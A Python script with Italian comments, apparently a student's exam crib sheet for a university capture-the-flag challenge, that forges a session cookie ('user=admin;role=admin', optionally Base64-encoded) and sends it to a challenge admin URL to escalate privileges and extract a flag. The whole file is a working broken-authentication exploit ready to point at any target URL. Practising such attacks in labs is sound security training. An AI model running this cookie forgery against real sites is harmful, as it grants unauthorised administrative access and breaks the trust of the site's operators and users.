#!/usr/bin/env python3
"""
PRONTUARIO #05: Web Cookie Tampering & Broken Auth Exploit
--------------------------------------------------------
Modulo: Web Security / Broken Access Control
Descrizione: Forgiatura di cookie di sessione (in chiaro o Base64)
            per effettuare Privilege Escalation verso risorse protette.
"""

import requests
import base64

# ==================== INPUT DATI D'ESAME ====================
TARGET_URL = "http://challenge.unipd.it:8080/admin"  # URL della risorsa protetta
COOKIE_NAME = "auth_session"                          # Nome del cookie di sessione

# PAYLOAD PER PRIVILEGE ESCALATION
# Caso A: Stringa in chiaro da forgiare (es. "user=admin;role=admin")
RAW_PAYLOAD = "user=admin;role=admin"

# Caso B: Se il cookie richiede la codifica in Base64
USE_BASE64 = True
# ============================================================


def craft_cookie_value(payload: str, encode_b64: bool) -> str:
    """Prepara il valore del cookie eventualmente applicando la codifica Base64."""
    if encode_b64:
        # Convertiamo la stringa in byte, poi in Base64 e infine di nuovo in stringa
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    return payload


def main():
    print(f"[*] Avvio Exploit Cookie Tampering su Target: {TARGET_URL}")
    
    # 1. Preparazione del cookie alterato
    forged_value = craft_cookie_value(RAW_PAYLOAD, USE_BASE64)
    cookies_dict = {COOKIE_NAME: forged_value}
    
    print(f"[*] Cookie Forgiato: {COOKIE_NAME} = {forged_value}")
    print("[*] Invio richiesta HTTP GET con le credenziali modificate...\n")

    try:
        # 2. Invio della richiesta HTTP con il cookie manipolato
        response = requests.get(TARGET_URL, cookies=cookies_dict, timeout=5)
        
        # 3. Analisi della risposta
        print(f"[+] Codice Risposta HTTP: {response.status_code}")
        
        if "flag{" in response.text:
            print("\n=== PRIVILEGE ESCALATION RIUSCITA! ===")
            # Estraiamo la flag dalla risposta HTML/Text
            start_idx = response.text.find("flag{")
            end_idx = response.text.find("}", start_idx) + 1
            print(f" Flag Trovata: {response.text[start_idx:end_idx]}")
            print("=====================================")
        else:
            print("[!] Flag non trovata nell'HTML restituito. Controlla il contenuto della risposta:")
            print(response.text[:500]) # Stampa i primi 500 caratteri dell'HTML

    except Exception as e:
        print(f"[!] Errore di connessione: {e}")


if __name__ == "__main__":
    main()
